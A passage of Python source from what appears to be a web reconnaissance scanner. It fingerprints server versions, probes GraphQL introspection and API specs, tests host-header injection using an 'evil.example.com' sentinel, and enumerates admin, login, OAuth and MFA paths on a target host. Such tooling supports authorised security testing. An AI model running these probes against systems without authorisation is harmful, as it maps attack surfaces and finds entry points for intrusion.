        (r"Laravel.*?([\d.]+)", "Laravel"),
        (r"Rails.*?([\d.]+)", "Rails"),
        (r"WordPress\s+([\d.]+)", "WordPress"),
        (r"Drupal\s+([\d.]+)", "Drupal"),
        (r"ASP\.NET\s+Version:([\d.]+)", "ASP.NET"),
        (r"Tomcat/([\d.]+)", "Tomcat"),
        (r"Jetty\(([\d.]+)", "Jetty"),
    ]
    combined = body + " " + " ".join(f"{k}: {v}" for k, v in headers.items())
    for pat, name in version_patterns:
        m = re.search(pat, combined, re.IGNORECASE)
        if m:
            version = m.group(1) if m.lastindex else "detected"
            result["version_leaks"].append({"software": name, "version": version})

    # Framework hints from error page content
    hint_patterns = [
        (r"Whitelabel Error Page", "Spring Boot"),
        (r"Django Debug", "Django (DEBUG=True)"),
        (r"Laravel", "Laravel"),
        (r"Symfony\\Component", "Symfony"),
        (r"CakePHP", "CakePHP"),
        (r"CodeIgniter", "CodeIgniter"),
        (r"Werkzeug Debugger", "Flask/Werkzeug (debug mode)"),
        (r"Express</title>", "Express.js"),
        (r"<address>Apache", "Apache"),
        (r"<address>nginx", "nginx"),
        (r"IIS Windows Server", "IIS"),
        (r"Powered by.*WordPress", "WordPress"),
    ]
    for pat, name in hint_patterns:
        if re.search(pat, body, re.IGNORECASE):
            result["framework_hints"].append(name)

    return result


# ── GraphQL Introspection Probe ──────────────────────────────────────────

_GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/graphql/v1",
    "/query",
    "/api/query",
    "/graphiql",
    "/altair",
    "/playground",
]

_INTROSPECTION_QUERY = '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}'


def check_graphql_introspection(host: str, port: int, use_ssl: bool,
                                 timeout: int = 6,
                                 extra_headers: Optional[Dict[str, str]] = None,
                                 ) -> Dict[str, Any]:
    """Probe common GraphQL endpoints for introspection enabled.

    Exposed introspection reveals the entire API schema — high-value recon.
    """
    from fray.recon.http import _post_json

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    result: Dict[str, Any] = {
        "endpoints_found": [],
        "introspection_enabled": [],
        "types_found": [],
        "total_types": 0,
        "total_fields": 0,
    }

    for gql_path in _GRAPHQL_PATHS:
        url = f"{base}{gql_path}"

        # Directly POST introspection query — most reliable detection
        post_status, post_body = _post_json(url, _INTROSPECTION_QUERY,
                                             timeout=timeout,
                                             verify_ssl=True,
                                             headers=extra_headers)

        if post_status == 0:
            continue

        # Any meaningful response to a GraphQL query means endpoint exists
        is_graphql = False
        if post_body:
            lower = post_body.lower()
            if any(kw in lower for kw in ('"data"', '"errors"', '__schema',
                                           'graphql', 'must provide',
                                           '"message"')):
                is_graphql = True

        if not is_graphql:
            continue

        result["endpoints_found"].append(gql_path)

        if post_status == 200 and "__schema" in post_body:
            result["introspection_enabled"].append(gql_path)

            # Parse types from response
            try:
                data = json.loads(post_body)
                types = data.get("data", {}).get("__schema", {}).get("types", [])
                user_types = []
                total_fields = 0
                for t in types:
                    name = t.get("name", "")
                    # Skip built-in GraphQL types
                    if name.startswith("__") or name in ("String", "Int", "Float",
                                                          "Boolean", "ID", "DateTime"):
                        continue
                    fields = t.get("fields") or []
                    field_names = [f.get("name", "") for f in fields]
                    total_fields += len(field_names)
                    user_types.append({
                        "name": name,
                        "fields": field_names[:10],  # cap for display
                        "field_count": len(field_names),
                    })
                result["types_found"] = user_types[:20]
                result["total_types"] = len(user_types)
                result["total_fields"] = total_fields
            except (json.JSONDecodeError, AttributeError, KeyError):
                pass

            break  # Found introspection on one endpoint, no need to check others

    return result


# ── API Discovery ────────────────────────────────────────────────────────

# Common API spec / documentation paths
_API_SPEC_PATHS = [
    # OpenAPI / Swagger
    ("/swagger.json", "swagger"),
    ("/swagger/v1/swagger.json", "swagger"),
    ("/api/swagger.json", "swagger"),
    ("/v1/swagger.json", "swagger"),
    ("/v2/swagger.json", "swagger"),
    ("/v3/swagger.json", "swagger"),
    ("/openapi.json", "openapi"),
    ("/api/openapi.json", "openapi"),
    ("/v1/openapi.json", "openapi"),
    ("/v2/openapi.json", "openapi"),
    ("/v3/openapi.json", "openapi"),
    ("/openapi.yaml", "openapi"),
    ("/swagger-ui.html", "swagger-ui"),
    ("/swagger-ui/", "swagger-ui"),
    ("/swagger/", "swagger-ui"),
    ("/api-docs", "api-docs"),
    ("/api-docs/", "api-docs"),
    ("/docs", "docs"),
    ("/redoc", "redoc"),
    # Common API versioned roots
    ("/api/", "api-root"),
    ("/api/v1/", "api-root"),
    ("/api/v2/", "api-root"),
    ("/api/v3/", "api-root"),
    ("/v1/", "api-root"),
    ("/v2/", "api-root"),
    # Health / metadata endpoints
    ("/api/health", "health"),
    ("/health", "health"),
    ("/healthz", "health"),
    ("/api/status", "status"),
    ("/api/version", "version"),
    ("/api/info", "info"),
    # GraphQL docs (supplement to introspection probe)
    ("/graphql/schema", "graphql"),
    ("/graphql/explorer", "graphql"),
]


def check_api_discovery(host: str, port: int, use_ssl: bool,
                         timeout: int = 5,
                         extra_headers: Optional[Dict[str, str]] = None,
                         fast: bool = False,
                         ) -> Dict[str, Any]:
    """Probe common API paths to discover specs, docs, and versioned endpoints.

    Swagger/OpenAPI specs expose every endpoint, parameter, and auth method.
    In fast mode, only probes the top 10 most common paths instead of all 30+.
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    import concurrent.futures

    found = []
    specs = []

    # In fast mode, only probe the most valuable paths (specs + docs)
    _paths = _API_SPEC_PATHS
    if fast:
        _fast_cats = {"swagger", "openapi", "swagger-ui", "api-docs", "redoc"}
        _paths = [(p, c) for p, c in _API_SPEC_PATHS if c in _fast_cats][:12]

    def _probe_api(api_path, category):
        url = f"{base}{api_path}"
        try:
            status, body, resp_headers = _fetch_url(url, timeout=timeout,
                                                     verify_ssl=True,
                                                     headers=extra_headers)
            if status == 0 and use_ssl:
                status, body, resp_headers = _fetch_url(url, timeout=timeout,
                                                         verify_ssl=False,
                                                         headers=extra_headers)
        except Exception:
            return None, None

        if status == 0 or status >= 400:
            return None, None

        ct = resp_headers.get("content-type", "")
        is_json = "json" in ct or "yaml" in ct
        is_html = "html" in ct

        entry = {
            "path": api_path,
            "status": status,
            "category": category,
            "content_type": ct.split(";")[0].strip(),
        }

        is_spec = False
        if is_json and body and category in ("swagger", "openapi"):
            try:
                spec = json.loads(body)
                info = spec.get("info", {})
                paths = spec.get("paths", {})
                entry["spec"] = True
                entry["title"] = info.get("title", "")
                entry["version"] = info.get("version", "")
                entry["endpoints"] = len(paths)
                entry["methods"] = []
                for ep_path, methods in list(paths.items())[:30]:
                    for method in methods:
                        if method.lower() in ("get", "post", "put", "patch", "delete", "options"):
                            entry["methods"].append(f"{method.upper()} {ep_path}")
                is_spec = True
            except (json.JSONDecodeError, AttributeError):
                pass

        elif is_html and body and category in ("swagger-ui", "api-docs", "docs", "redoc"):
            lower = body.lower()
            if any(kw in lower for kw in ("swagger", "openapi", "api", "redoc",
                                           "endpoint", "schema", "try it out")):
                entry["spec"] = False
                entry["docs_page"] = True
                return entry, None
            return None, None

        elif category in ("api-root", "health", "status", "version", "info"):
            if is_json or (is_html and len(body) < 5000):
                return entry, None
            return None, None

        if is_spec:
            return entry, entry
        elif category not in ("swagger-ui", "api-docs", "docs", "redoc"):
            return entry, None
        return None, None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_api, p, c): p for p, c in _paths}
        for future in concurrent.futures.as_completed(futures):
            try:
                entry, spec_entry = future.result()
                if entry:
                    found.append(entry)
                if spec_entry:
                    specs.append(spec_entry)
            except Exception:
                pass

    return {
        "endpoints_found": found,
        "specs_found": specs,
        "total": len(found),
        "has_spec": len(specs) > 0,
    }


# ── Host Header Injection ───────────────────────────────────────────────

# Headers that apps commonly trust for building URLs (password reset links,
# canonical URLs, redirect targets, cache keys).
_HOST_OVERRIDE_HEADERS = [
    ("X-Forwarded-Host", "evil.example.com"),
    ("X-Host", "evil.example.com"),
    ("X-Forwarded-Server", "evil.example.com"),
    ("Forwarded", "host=evil.example.com"),
    ("X-Original-URL", "/non-existent-hhi-test"),
    ("X-Rewrite-URL", "/non-existent-hhi-test"),
    ("X-Forwarded-Prefix", "/evil"),
]

# Sentinel value we inject — if it appears in the response body the app
# blindly trusts our injected header for building URLs.
_HHI_SENTINEL = "evil.example.com"


def check_host_header_injection(host: str, port: int, use_ssl: bool,
                                 timeout: int = 6,
                                 extra_headers: Optional[Dict[str, str]] = None,
                                 ) -> Dict[str, Any]:
    """Probe for Host Header Injection (password reset poisoning, cache poisoning, SSRF).

    Sends requests with manipulated Host/X-Forwarded-Host headers and checks
    if the injected value is reflected in the response body (links, redirects,
    meta tags, etc.).
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    result: Dict[str, Any] = {
        "vulnerable_headers": [],
        "reflected": False,
        "details": [],
    }

    # 1. Baseline request
    try:
        base_status, base_body, base_hdrs = _fetch_url(base + "/",
                                                         timeout=timeout,
                                                         verify_ssl=True,
                                                         headers=extra_headers)
        if base_status == 0 and use_ssl:
            base_status, base_body, base_hdrs = _fetch_url(base + "/",
                                                             timeout=timeout,
                                                             verify_ssl=False,
                                                             headers=extra_headers)
    except Exception:
        return result

    if base_status == 0:
        return result

    # 2. Test each override header (parallel for speed)
    import concurrent.futures

    def _probe_hhi(header_name, header_value):
        test_headers = dict(extra_headers) if extra_headers else {}
        test_headers[header_name] = header_value
        try:
            status, body, hdrs = _fetch_url(base + "/",
                                             timeout=timeout,
                                             verify_ssl=True,
                                             headers=test_headers)
            if status == 0 and use_ssl:
                status, body, hdrs = _fetch_url(base + "/",
                                                 timeout=timeout,
                                                 verify_ssl=False,
                                                 headers=test_headers)
        except Exception:
            return None
        if status == 0:
            return None

        finding = {
            "header": header_name,
            "value": header_value,
            "reflected": False,
            "status_changed": status != base_status,
            "status": status,
        }
        if body and _HHI_SENTINEL in body.lower():
            if not base_body or _HHI_SENTINEL not in base_body.lower():
                finding["reflected"] = True
        location = hdrs.get("location", "")
        if _HHI_SENTINEL in location.lower():
            finding["reflected"] = True
            finding["redirect"] = location
        return finding

    with concurrent.futures.ThreadPoolExecutor(max_workers=7) as pool:
        futures = {pool.submit(_probe_hhi, h, v): h
                   for h, v in _HOST_OVERRIDE_HEADERS}
        for future in concurrent.futures.as_completed(futures):
            try:
                finding = future.result()
            except Exception:
                continue
            if finding is None:
                continue
            if finding["reflected"]:
                result["reflected"] = True
                if finding["header"] not in result["vulnerable_headers"]:
                    result["vulnerable_headers"].append(finding["header"])
            if finding["reflected"] or finding["status_changed"]:
                result["details"].append(finding)

    return result


# ── Admin Panel Discovery ───────────────────────────────────────────────

# #9 — Admin panel vendor fingerprints: (vendor_name, body_pattern, version_regex)
_ADMIN_VENDOR_FINGERPRINTS = [
    ("WordPress", re.compile(r'wp-admin|wordpress|wp-content|wp-includes', re.I),
     re.compile(r'<meta[^>]+generator["\'][^>]*WordPress\s+([\d.]+)', re.I)),
    ("Joomla", re.compile(r'joomla|com_content|/administrator/index\.php', re.I),
     re.compile(r'<meta[^>]+generator["\'][^>]*Joomla!\s*([\d.]+)', re.I)),
    ("Drupal", re.compile(r'drupal|sites/default|drupal\.js', re.I),
     re.compile(r'Drupal\s+([\d.]+)', re.I)),
    ("phpMyAdmin", re.compile(r'phpmyadmin|pma_password', re.I),
     re.compile(r'phpMyAdmin\s+([\d.]+)', re.I)),
    ("Adminer", re.compile(r'adminer', re.I),
     re.compile(r'Adminer\s+([\d.]+)', re.I)),
    ("Grafana", re.compile(r'grafana', re.I),
     re.compile(r'Grafana\s+v?([\d.]+)', re.I)),
    ("Kibana", re.compile(r'kibana', re.I),
     re.compile(r'Kibana\s+([\d.]+)', re.I)),
    ("Jenkins", re.compile(r'jenkins|hudson', re.I),
     re.compile(r'Jenkins\s+ver\.\s*([\d.]+)', re.I)),
    ("GitLab", re.compile(r'gitlab', re.I),
     re.compile(r'GitLab[^"]*?([\d]+\.[\d]+\.[\d]+)', re.I)),
    ("Portainer", re.compile(r'portainer', re.I), None),
    ("Rancher", re.compile(r'rancher', re.I), None),
    ("cPanel", re.compile(r'cpanel|whm', re.I),
     re.compile(r'cPanel\s+([\d.]+)', re.I)),
    ("Plesk", re.compile(r'plesk', re.I),
     re.compile(r'Plesk\s+([\d.]+)', re.I)),
    ("Apache Tomcat", re.compile(r'tomcat|catalina', re.I),
     re.compile(r'Apache Tomcat[/\s]+([\d.]+)', re.I)),
    ("Spring Boot Actuator", re.compile(r'actuator|spring-boot', re.I), None),
    ("Django Admin", re.compile(r'django|csrfmiddlewaretoken', re.I), None),
    ("Laravel", re.compile(r'laravel|xsrf-token', re.I), None),
    ("Rails", re.compile(r'rails|authenticity_token', re.I), None),
    ("Express", re.compile(r'express', re.I), None),
    ("Webmin", re.compile(r'webmin', re.I),
     re.compile(r'Webmin\s+([\d.]+)', re.I)),
    ("Cockpit", re.compile(r'cockpit-ws|cockpit-login', re.I), None),
    ("Prometheus", re.compile(r'prometheus', re.I),
     re.compile(r'Prometheus\s+([\d.]+)', re.I)),
    ("Traefik", re.compile(r'traefik', re.I), None),
    ("SonarQube", re.compile(r'sonarqube|sonar', re.I),
     re.compile(r'SonarQube\s+([\d.]+)', re.I)),
    ("Elasticsearch", re.compile(r'elasticsearch|you know,?\s*for search|"cluster_name"\s*:|"lucene_version"', re.I),
     re.compile(r'"number"\s*:\s*"([\d.]+)"')),
    ("MinIO", re.compile(r'minio', re.I), None),
    ("Nagios", re.compile(r'nagios', re.I),
     re.compile(r'Nagios[^"]*?([\d]+\.[\d]+\.[\d]+)', re.I)),
    ("Zabbix", re.compile(r'zabbix', re.I),
     re.compile(r'Zabbix\s+([\d.]+)', re.I)),
]

_ADMIN_PATHS = [
    # Generic
    ("/admin", "generic"),
    ("/admin/", "generic"),
    ("/administrator", "generic"),
    ("/administrator/", "generic"),
    ("/admin/login", "generic"),
    ("/admin/login.php", "generic"),
    ("/admin/index.php", "generic"),
    ("/adminpanel", "generic"),
    ("/admin-panel", "generic"),
    ("/admin.php", "generic"),
    # WordPress
    ("/wp-admin/", "wordpress"),
    ("/wp-login.php", "wordpress"),
    ("/wp-admin/admin-ajax.php", "wordpress"),
    # Joomla
    ("/administrator/index.php", "joomla"),
    # Drupal
    ("/user/login", "drupal"),
    ("/admin/config", "drupal"),
    # cPanel / hosting
    ("/cpanel", "cpanel"),
    ("/webmail", "cpanel"),
    ("/whm", "cpanel"),
    # phpMyAdmin
    ("/phpmyadmin/", "database"),
    ("/phpmyadmin/index.php", "database"),
    ("/pma/", "database"),
    ("/myadmin/", "database"),
    ("/dbadmin/", "database"),
    ("/adminer.php", "database"),
    ("/adminer/", "database"),
    # Dashboards
    ("/dashboard", "dashboard"),
    ("/dashboard/", "dashboard"),
    ("/panel", "dashboard"),
    ("/panel/", "dashboard"),
    ("/console", "dashboard"),
    ("/console/", "dashboard"),
    ("/manage", "dashboard"),
    ("/management", "dashboard"),
    ("/portal", "dashboard"),
    ("/controlpanel", "dashboard"),
    # Java / Spring / Tomcat
    ("/manager/html", "tomcat"),
    ("/manager/status", "tomcat"),
    ("/host-manager/html", "tomcat"),
    ("/actuator", "spring"),
    ("/actuator/env", "spring"),
    ("/actuator/health", "spring"),
    # Node / dev tools
    ("/_debugbar", "debug"),
    ("/__debug__/", "debug"),
    ("/debug/default/login", "debug"),
    ("/elmah.axd", "debug"),
    # Server status
    ("/server-status", "apache"),
    ("/server-info", "apache"),
    ("/nginx_status", "nginx"),
    # Other CMS / frameworks
    ("/admin/dashboard", "generic"),
    ("/backend", "generic"),
    ("/backend/", "generic"),
    ("/cms", "generic"),
    ("/cms/admin", "generic"),
    ("/siteadmin", "generic"),
    ("/webadmin", "generic"),
    ("/moderator", "generic"),
    ("/filemanager", "generic"),
    ("/filemanager/", "generic"),
    # API management
    ("/graphql", "api"),
    ("/graphiql", "api"),
    ("/playground", "api"),
    # Common login paths (high-value auth entry points)
    ("/login", "login"),
    ("/login/", "login"),
    ("/signin", "login"),
    ("/sign-in", "login"),
    ("/auth/login", "login"),
    ("/auth/signin", "login"),
    ("/user/login", "login"),
    ("/account/login", "login"),
    ("/accounts/login", "login"),
    ("/session/new", "login"),
    # TYPO3
    ("/typo3/", "typo3"),
    ("/typo3/index.php", "typo3"),
    # Magento / Adobe Commerce
    ("/admin_/", "magento"),
    ("/index.php/admin", "magento"),
    ("/admin_area/", "magento"),
    # PrestaShop
    ("/adminprestashop/", "prestashop"),
    ("/admin1234/", "prestashop"),
    # OpenCart
    ("/admin/index.php?route=common/login", "opencart"),
    # Ghost CMS
    ("/ghost/", "ghost"),
    ("/ghost/#/signin", "ghost"),
    # Strapi headless CMS
    ("/admin/auth/login", "strapi"),
    ("/admin/auth/register", "strapi"),
    # Directus
    ("/admin/login", "directus"),
    ("/directus/admin", "directus"),
    # Craft CMS
    ("/admin/login", "craft"),
    ("/cpanel/login", "craft"),
    # October CMS
    ("/backend/", "october"),
    ("/backend/backend/auth", "october"),
    # Concrete5
    ("/index.php/login", "concrete5"),
    # Payload CMS
    ("/admin/collections", "payload"),
    # Kirby CMS
    ("/panel/", "kirby"),
    # Shopify / e-commerce admin detection
    ("/admin/auth/login", "shopify"),
    # SilverStripe
    ("/admin/", "silverstripe"),
    ("/Security/login", "silverstripe"),
    # WHMCS
    ("/admin/login.php", "whmcs"),
    # Moodle
    ("/login/index.php", "moodle"),
    ("/admin/index.php", "moodle"),
    # XenForo
    ("/admin.php", "xenforo"),
    ("/admin.php?login/login", "xenforo"),
    # vBulletin
    ("/admincp/", "vbulletin"),
    ("/admincp/index.php", "vbulletin"),
    # Bitrix
    ("/bitrix/admin/", "bitrix"),
    ("/bitrix/admin/index.php", "bitrix"),
    # SAP BusinessObjects
    ("/BOE/BI/", "sap"),
    # Jenkins
    ("/jenkins/login", "jenkins"),
    ("/jenkins/j_acegi_security_check", "jenkins"),
    # Grafana
    ("/grafana/login", "grafana"),
    # Kibana
    ("/kibana/", "kibana"),
    # Portainer
    ("/portainer/", "portainer"),
    ("/#!/init/admin", "portainer"),
    # AWS-style internal dashboards
    ("/_ah/admin", "gae"),
    # Azure DevOps
    ("/_login", "azure_devops"),
    # Signup / registration (high value for mass assignment testing)
    ("/signup", "signup"),
    ("/register", "signup"),
    ("/registration", "signup"),
    ("/auth/signup", "signup"),
    ("/auth/register", "signup"),
    ("/api/register", "signup"),
    ("/api/auth/register", "signup"),
    ("/api/v1/register", "signup"),
    ("/user/register", "signup"),
    ("/accounts/register", "signup"),
    ("/accounts/signup", "signup"),
    # Password reset (auth testing)
    ("/forgot-password", "auth"),
    ("/password-reset", "auth"),
    ("/reset-password", "auth"),
    ("/auth/reset", "auth"),
    ("/api/auth/reset", "auth"),
    # 2FA / MFA endpoints
    ("/2fa", "2fa"),
    ("/mfa", "2fa"),
    ("/totp", "2fa"),
    ("/otp", "2fa"),
    ("/verify", "2fa"),
    ("/api/auth/verify", "2fa"),
]


def check_admin_panels(host: str, port: int, use_ssl: bool,
                        timeout: int = 5,
                        extra_headers: Optional[Dict[str, str]] = None,
                        ) -> Dict[str, Any]:
    """Probe common admin panel paths — saves manual enumeration every engagement.

    Checks 70 paths covering WordPress, Joomla, Drupal, phpMyAdmin, Tomcat,
    Spring actuator, debug tools, and generic admin panels.
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    import concurrent.futures

    found = []

    def _probe_admin(admin_path, category):
        url = f"{base}{admin_path}"
        try:
            status, body, hdrs = _fetch_url(url, timeout=timeout,
                                             verify_ssl=True,
                                             headers=extra_headers)
            if status == 0 and use_ssl:
                status, body, hdrs = _fetch_url(url, timeout=timeout,
                                                 verify_ssl=False,
                                                 headers=extra_headers)
        except Exception:
            return None

        if status == 0 or status >= 404:
            return None

        ct = hdrs.get("content-type", "")
        is_html = "html" in ct
        lower = body.lower() if body else ""
        confidence = 0  # 0=none, 1=low, 2=medium, 3=high

        # ── Strong positive signals — high confidence ────────────────────
        # These only appear in real admin tools, never in social/SPA catch-alls
        _HIGH_CONF_SIGNALS = (
            '<input type="password"', 'phpmyadmin', 'adminer',
            'wp-login', 'wp-admin', 'joomla', 'drupal',
            '<form action', 'cockpit', 'server-status', 'server-info',
            'actuator', 'x-application-context', 'spring boot',
            'tomcat', 'manager app', 'host manager',
            'grafana', 'kibana', 'elasticsearch',
            'cpanel', 'webmin', 'plesk', 'directadmin',
            'sign in to your account', 'administrator login',
            'admin login', 'management console',
        )
        # ── Weak signals — many legitimate pages also contain these ─────
        _LOW_CONF_SIGNALS = (
            "login", "password", "username", "sign in", "log in",
            "authentication", "dashboard", "panel", "console",
            "manager", "debug", "configuration",
        )
        # ── Catch-all / social platform markers — disqualify ────────────
        _CATCHALL_MARKERS = (
            # SPA frameworks (serve same HTML for every path)
            '__next_data__', '__nuxt', 'window.__app',
            'react.createElement', 'reactdom.render',
            'vue.config', 'angular.', '_app.js', 'webpack',
            # Social / large platform indicators
            'og:type" content="profile"',
            '"@context": "https://schema.org"',
            'twitter:card', 'twitter:site',
            # CDN / hosting error pages
            'cloudflare-static', 'proxy-status',
            # X / Twitter specific
            'twitter.com', 'x.com/home', 'twitterjs',
            '"main_app"', 'birdsong', 'loggedout',
        )

        if status in (401, 403):
            # Protected path — genuine signal regardless of body
            confidence = 2

        elif status in (301, 302, 303, 307, 308):
            # Redirect — only count if destination looks admin-specific
            redirect_dest = hdrs.get("location", "").lower()
            admin_dest_signals = ("login", "signin", "auth", "admin", "dashboard")
            if any(s in redirect_dest for s in admin_dest_signals):
                confidence = 1  # low — redirect to login page is common on social platforms too
            else:
                return None  # redirect to home/feed = catch-all, not admin

        elif status == 200 and body:
            b_lower = lower
            # Disqualify catch-alls and social platforms immediately
            if any(m in b_lower for m in _CATCHALL_MARKERS):
                return None
            # Large body with no strong admin signal = SPA catch-all
            if len(body) > 15000 and not any(s in b_lower for s in _HIGH_CONF_SIGNALS):
                return None
            if any(s in b_lower for s in _HIGH_CONF_SIGNALS):
                confidence = 3  # high — definitive admin tool signal
            elif any(s in b_lower for s in _LOW_CONF_SIGNALS) and is_html:
                confidence = 2  # medium — has login-like content
            elif not is_html:
                confidence = 2  # non-HTML on an admin path = interesting
            else:
                return None  # HTML page with no admin signals = catch-all
        else:
            return None

        # Require at least low confidence for 401/403, medium for everything else
        if status in (401, 403) and confidence < 1:
            return None
        if status not in (401, 403) and confidence < 2:
            return None

        _CONF_LABEL = {1: "low", 2: "medium", 3: "high"}
        entry = {
            "path": admin_path,
            "url": f"{base}{admin_path}",   # full URL for display
            "status": status,
            "category": category,
            "confidence": _CONF_LABEL.get(confidence, "low"),
        }
        if status in (301, 302, 303, 307, 308):
            entry["redirect"] = hdrs.get("location", "")
        if status in (401, 403):
            entry["protected"] = True
        elif status == 200:
            entry["protected"] = False

        # #9 — Vendor fingerprinting
        vendor = None
        version = None
        if body:
            for vname, vpat, vver in _ADMIN_VENDOR_FINGERPRINTS:
                if vpat.search(lower):
                    vendor = vname
                    if vver:
                        vm = vver.search(body)
                        if vm:
                            version = vm.group(1)
                    break
        # Also check server header
        if not vendor:
            srv = hdrs.get("server", "").lower()
            if "apache" in srv:
                vendor = "Apache"
            elif "nginx" in srv:
                vendor = "nginx"
            elif "tomcat" in srv:
                vendor = "Apache Tomcat"
            elif "iis" in srv:
                vendor = "Microsoft IIS"
        if vendor:
            entry["vendor"] = vendor
        if version:
            entry["version"] = version

        return entry

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_admin, p, c): p for p, c in _ADMIN_PATHS}
        for future in concurrent.futures.as_completed(futures):
            try:
                entry = future.result()
                if entry:
                    found.append(entry)
            except Exception:
                pass

    # #9 — Vendor distribution + confidence breakdown
    vendor_counts: Dict[str, int] = {}
    high_conf = [f for f in found if f.get("confidence") == "high"]
    medium_conf = [f for f in found if f.get("confidence") == "medium"]
    low_conf = [f for f in found if f.get("confidence") == "low"]
    for f in found:
        v = f.get("vendor")
        if v:
            vendor_counts[v] = vendor_counts.get(v, 0) + 1

    return {
        "panels_found": found,
        "total": len(found),
        # Verified = high or medium confidence only — used for CRITICAL finding count
        "total_verified": len(high_conf) + len(medium_conf),
        "confidence_breakdown": {
            "high": len(high_conf),
            "medium": len(medium_conf),
            "low": len(low_conf),
        },
        "vendors": vendor_counts,
        "vendor_list": sorted(vendor_counts.keys()),
    }


_AUTH_PATHS = [
    # Login / Sign-in
    ("/login", "login"),
    ("/signin", "login"),
    ("/sign-in", "login"),
    ("/auth/login", "login"),
    ("/user/login", "login"),
    ("/users/sign_in", "login"),
    ("/accounts/login", "login"),
    ("/wp-login.php", "login"),
    ("/admin/login", "login"),
    # Registration
    ("/register", "registration"),
    ("/signup", "registration"),
    ("/sign-up", "registration"),
    ("/auth/register", "registration"),
    ("/user/register", "registration"),
    ("/users/sign_up", "registration"),
    ("/accounts/signup", "registration"),
    ("/join", "registration"),
    # OAuth / SSO
    ("/oauth/authorize", "oauth"),
    ("/oauth2/authorize", "oauth"),
    ("/auth/oauth", "oauth"),
    ("/.well-known/openid-configuration", "oauth"),
    ("/oauth/token", "oauth"),
    ("/api/oauth/token", "oauth"),
    ("/auth/saml", "sso"),
    ("/saml/login", "sso"),
    ("/sso/login", "sso"),
    # Password reset
    ("/forgot-password", "password_reset"),
    ("/password/reset", "password_reset"),
    ("/auth/forgot", "password_reset"),
    ("/users/password/new", "password_reset"),
    ("/accounts/password/reset", "password_reset"),
    # MFA / 2FA
    ("/2fa", "mfa"),
    ("/auth/2fa", "mfa"),
    ("/mfa", "mfa"),
    ("/totp", "mfa"),
    ("/auth/verify", "mfa"),
    # API authentication
    ("/api/auth", "api_auth"),
    ("/api/v1/auth", "api_auth"),
    ("/api/login", "api_auth"),
    ("/api/token", "api_auth"),
    ("/auth/token", "api_auth"),
    ("/api/v1/token", "api_auth"),
    # Session / Logout
    ("/logout", "session"),
    ("/signout", "session"),
    ("/auth/logout", "session"),
]


def check_auth_endpoints(host: str, port: int, use_ssl: bool,
                         timeout: int = 5,
                         extra_headers: Optional[Dict[str, str]] = None,
                         ) -> Dict[str, Any]:
    """Probe common login, registration, OAuth, MFA, and API auth endpoints.

    Returns categorized auth endpoints with status, protection flags,
    and auth-specific metadata (CSRF tokens, OAuth flows, etc.).
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    import concurrent.futures

    _LOGIN_SIGNALS = (
        "login", "password", "username", "sign in", "log in",
        "authenticate", "email", "credential",
        '<input type="password"', 'type="submit"',
    )
    _REGISTRATION_SIGNALS = (
        "register", "sign up", "create account", "join",
        "confirm password", "email", "username",
    )
    _OAUTH_SIGNALS = (
        "client_id", "redirect_uri", "response_type", "grant_type",
        "authorization_endpoint", "token_endpoint", "openid",
    )
    _MFA_SIGNALS = (
        "verification code", "authenticator", "2fa", "two-factor",
        "totp", "one-time", "mfa",
    )

    found = []

    def _probe_auth(auth_path, category):
        url = f"{base}{auth_path}"
        try:
            status, body, hdrs = _fetch_url(url, timeout=timeout,
                                             verify_ssl=True,
                                             headers=extra_headers)
            if status == 0 and use_ssl:
                status, body, hdrs = _fetch_url(url, timeout=timeout,
                                                 verify_ssl=False,
                                                 headers=extra_headers)
        except Exception:
            return None

        if status == 0 or status >= 500:
            return None
        if status == 404:
            return None

        lower = body.lower() if body else ""
        ct = hdrs.get("content-type", "")

        entry = {
            "path": auth_path,
            "url": f"{base}{auth_path}",   # full URL for display in reports
            "status": status,
            "category": category,
        }

        # Redirect: follow and note destination
        if status in (301, 302, 303, 307, 308):
            loc = hdrs.get("location", "")
            entry["redirect"] = loc
            entry["accessible"] = True
            return entry

        # Protected (401/403) — endpoint exists but is guarded
        if status in (401, 403):
            entry["accessible"] = False
            entry["protected"] = True
            www_auth = hdrs.get("www-authenticate", "")
            if www_auth:
                entry["auth_scheme"] = www_auth.split()[0] if www_auth else None
            return entry

        # 200 — check if it's actually an auth-related page
        if status == 200 and body:
            is_auth_page = False

            if category == "login" and any(s in lower for s in _LOGIN_SIGNALS):
                is_auth_page = True
            elif category == "registration" and any(s in lower for s in _REGISTRATION_SIGNALS):
                is_auth_page = True
            elif category == "oauth" and any(s in lower for s in _OAUTH_SIGNALS):
                is_auth_page = True
                if "openid" in lower or "authorization_endpoint" in lower:
                    entry["openid_discovery"] = True
            elif category == "sso":
                if any(s in lower for s in ("saml", "sso", "single sign", "identity provider")):
                    is_auth_page = True
            elif category == "password_reset" and any(s in lower for s in ("reset", "forgot", "email", "recover")):
                is_auth_page = True
            elif category == "mfa" and any(s in lower for s in _MFA_SIGNALS):
                is_auth_page = True
            elif category == "api_auth":
                if "json" in ct or any(s in lower for s in ("token", "api_key", "unauthorized")):
                    is_auth_page = True
            elif category == "session":
                is_auth_page = True

            if not is_auth_page:
                return None

            entry["accessible"] = True

            # Check for CSRF token
            if re.search(r'name\s*=\s*["\']csrf|_token|authenticity_token', lower):
                entry["has_csrf"] = True

            # Check for rate limit headers
            for rl_h in ("x-ratelimit-limit", "x-rate-limit-limit", "retry-after", "ratelimit-limit"):
                if rl_h in hdrs:
